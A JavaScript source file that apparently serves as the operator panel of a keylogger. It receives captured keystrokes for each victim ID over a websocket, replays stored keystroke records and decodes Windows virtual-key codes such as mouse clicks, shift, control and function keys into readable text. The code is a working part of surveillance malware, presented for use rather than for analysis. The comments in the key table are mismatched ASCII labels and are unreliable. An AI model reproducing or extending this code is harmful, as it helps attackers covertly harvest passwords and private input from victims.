const keyContent = document.querySelector("#key-content")
const deleteBtn = document.querySelector(".delete-btn")

const socket = io("", {
    path: '/socket.io',
    transports: ['websocket'],
    secure: true,
})

deleteBtn.addEventListener("click", () => {
    if (confirm("do you want to delete?")) {
        axios.get(`/panel/del?id=${ID}`).then(res => alert(res.data)).catch(err => alert(err.data))
        location.href = "/"
    }
})

socket.on(ID, data => { // remote data
    runner(data)
})

for (const keyObj of keyData) { // previous data
    runner(keyObj.key)
}

function runner(keyLine) { // spliting int code
    for (let intCode of keyLine.split(",").slice(0, -1)) {
        addKey(intCode)
    }
}

function addKey(intCode) { // adding key to display
    try {
        const span = document.createElement("span")
        let currentValue = ""
        if (intCode.includes("@")) {
            intCode = intCode.replace("@", "")
            currentValue = getAscii(intCode).toUpperCase()
        } else {
            currentValue = getAscii(intCode).toLowerCase()
        }

        console.log(`INT: ${intCode}, VALUE: ${currentValue}`);
        span.innerText = currentValue
        keyContent.appendChild(span)
    } catch (error) {
        console.log(`${intCode} - ERROR NOT FOUND.`, error)
    }
}

function getAscii(intCode) {
    const asciiTable = {
        "0": "[NUL]", // Null character
        "1": "[LCLICK]", // Start of Heading
        "2": "[RCLICK]", // Start of Text
        "3": "[ETX]", // End of Text
        "4": "[SCROLLCLICK]", // End of Transmission
        "5": "[ENQ]", // Enquiry
        "6": "[ACK]", // Acknowledge
        "7": "[BEL]", // Bell
        "8": "[BACKSPACE]", // Backspace
        "9": "[TAB]", // Horizontal Tab
        "10": "[LF]", // Line Feed/New Line
        "11": "[VT]", // Vertical Tab
        "12": "[CLEAR]", // Form Feed
        "13": "[ENTER]", // Carriage Return
        "14": "[SO]", // Shift Out
        "15": "[SI]", // Shift In
        "16": "", // Data Link Escape
        "17": "[RALT]", // Device Control 1 (often XON)
        "18": "[LALT]", // Device Control 2
        "19": "[PAUSEBREAK]", // Device Control 3 (often XOFF)
        "20": "[CAPSLOCK]", // Device Control 4
        "21": "[NAK]", // Negative Acknowledge
        "22": "[SYN]", // Synchronous Idle
        "23": "[ETB]", // End of Transmission Block
        "24": "[CAN]", // Cancel
        "25": "[EM]", // End of Medium
        "26": "[SUB]", // Substitute
        "27": "[ESC]", // Escape
        "28": "[FS]", // File Separator
        "29": "[GS]", // Group Separator
        "30": "[RS]", // Record Separator
        "31": "[US]", // Unit Separator
        "32": "[SPACE]", // Space
        "33": "[PAGEUP]", // Exclamation mark
        "34": "[PAGEDOWN]", // Double quote
        "35": "[END]", // Hash/Pound
        "36": "[HOME]", // Dollar
        "37": "[LEFT]", // Percent
        "38": "[UP]", // Ampersand
        "39": "[RIGHT]", // Single quote
        "40": "[DOWN]", // Left parenthesis
        "41": ")", // Right parenthesis
        "42": "*", // Asterisk
        "43": "+", // Plus
        "44": "[PRTSC]", // Comma
        "45": "[INSERT]", // Hyphen/dash
        "46": "[DELETE]", // Period/dot
        "47": "/", // Forward slash
        "48": "0",
        "49": "1",
        "50": "2",
        "51": "3",
        "52": "4",
        "53": "5",
        "54": "6",
        "55": "7",
        "56": "8",
        "57": "9",
        "58": ":", // Colon
        "59": ";", // Semicolon
        "60": "<", // Less than
        "61": "=", // Equal
        "62": ">", // Greater than
        "63": "?", // Question mark
        "64": "@", // At symbol
        "65": "A",
        "66": "B",
        "67": "C",
        "68": "D",
        "69": "E",
        "70": "F",
        "71": "G",
        "72": "H",
        "73": "I",
        "74": "J",
        "75": "K",
        "76": "L",
        "77": "M",
        "78": "N",
        "79": "O",
        "80": "P",
        "81": "Q",
        "82": "R",
        "83": "S",
        "84": "T",
        "85": "U",
        "86": "V",
        "87": "W",
        "88": "X",
        "89": "Y",
        "90": "Z",
        "91": "[WIN]",
        "92": "\\",
        "93": "]",
        "94": "^",
        "95": "_",
        "96": "0",
        "97": "1",
        "98": "2",
        "99": "3",
        "100": "4",
        "101": "5",
        "102": "6",
        "103": "7",
        "104": "8",
        "105": "9",
        "106": "*",
        "107": "+",
        "108": "l",
        "109": "-",
        "110": ".",
        "111": "\\",
        "112": "[F1]",
        "113": "[F2]",
        "114": "[F3]",
        "115": "[F4]",
        "116": "[F5]",
        "117": "[F6]",
        "118": "[F7]",
        "119": "[F8]",
        "120": "[F9]",
        "121": "[F10]",
        "122": "[F11]",
        "123": "[F12]",
        "124": "|",
        "125": "}",
        "126": "~",
        "145": "[SCROOLLOCK]",
        "144": "[NUMLOCK]",
        "160": "[LSHIFT]",
        "161": "[RSHIFT]",
        "162": "[LCTRL]",
        "163": "[RCTRL]",
        "190": ".",
        "188": ",",
        "186": ";",
        "189": "-",
        "187": "=",
        "165": "",
        "164": ""
    };

    return asciiTable[intCode]
}